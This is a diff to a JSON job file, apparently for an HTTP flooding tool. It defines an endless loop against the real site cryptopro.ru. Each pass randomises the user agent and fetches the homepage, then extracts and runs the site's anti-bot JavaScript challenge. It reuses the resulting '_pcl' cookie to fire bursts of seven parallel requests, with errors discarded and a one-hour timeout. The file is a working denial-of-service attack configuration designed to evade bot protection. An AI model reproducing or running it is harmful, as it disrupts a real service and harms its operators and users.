@@ -752,98 +752,94 @@
         }
       }
     }, {
-      "jobs": [
-        {
-          "type": "loop",
+      "type": "loop",
+      "args": {
+        "job": {
+          "type": "discard-error",
           "args": {
             "job": {
-              "type": "discard-error",
+              "type": "timeout",
               "args": {
+                "timeout": "1h",
                 "job": {
-                  "type": "timeout",
+                  "type": "sequence",
                   "args": {
-                    "timeout": "1h",
-                    "job": {
-                      "type": "sequence",
-                      "args": {
-                        "jobs": [
-                          {
-                            "type": "set-value",
-                            "name": "useragent",
-                            "args": {
-                              "value": "{{ random_user_agent }}"
+                    "jobs": [
+                      {
+                        "type": "set-value",
+                        "name": "useragent",
+                        "args": {
+                          "value": "{{ random_user_agent }}"
+                        }
+                      },
+                      {
+                        "type": "http-request",
+                        "name": "initial",
+                        "args": {
+                          "request": {
+                            "method": "GET",
+                            "path": "https://www.cryptopro.ru/",
+                            "headers": {
+                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
+                              "Accept": "text/html",
+                              "Accept-Language": "en-US",
+                              "Connection": "keep-alive"
                             }
-                          },
-                          {
-                            "type": "http-request",
-                            "name": "initial",
-                            "args": {
-                              "request": {
-                                "method": "GET",
-                                "path": "https://www.cryptopro.ru/",
-                                "headers": {
-                                  "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                  "Accept": "text/html",
-                                  "Accept-Language": "en-US",
-                                  "Connection": "keep-alive"
+                          }
+                        }
+                      },
+                      {
+                        "type": "set-value",
+                        "name": "source",
+                        "args": {
+                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
+                        }
+                      },
+                      {
+                        "type": "set-value",
+                        "name": "extract-script",
+                        "args": {
+                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
+                        }
+                      },
+                      {
+                        "type": "js",
+                        "name": "exec-script",
+                        "args": {
+                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
+                        }
+                      },
+                      {
+                        "type": "parallel",
+                        "args": {
+                          "jobs": [
+                            {
+                              "type": "http",
+                              "count": 7,
+                              "args": {
+                                "request": {
+                                  "method": "GET",
+                                  "path": "https://www.cryptopro.ru/",
+                                  "headers": {
+                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
+                                  },
+                                  "cookies": {
+                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
+                                  }
                                 }
                               }
                             }
-                          },
-                          {
-                            "type": "set-value",
-                            "name": "source",
-                            "args": {
-                              "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                            }
-                          },
-                          {
-                            "type": "set-value",
-                            "name": "extract-script",
-                            "args": {
-                              "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                            }
-                          },
-                          {
-                            "type": "js",
-                            "name": "exec-script",
-                            "args": {
-                              "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                            }
-                          },
-                          {
-                            "type": "parallel",
-                            "args": {
-                              "jobs": [
-                                {
-                                  "type": "http",
-                                  "count": 7,
-                                  "args": {
-                                    "request": {
-                                      "method": "GET",
-                                      "path": "https://www.cryptopro.ru/",
-                                      "headers": {
-                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                      },
-                                      "cookies": {
-                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                      }
-                                    }
-                                  }
-                                }
-                              ]
-                            }
-                          }
-                        ]
+                          ]
+                        }
                       }
-                    }
+                    ]
                   }
                 }
               }
             }
           }
         }
-      ]
+      }
     }, {
       "type": "http",
       "count": 7,
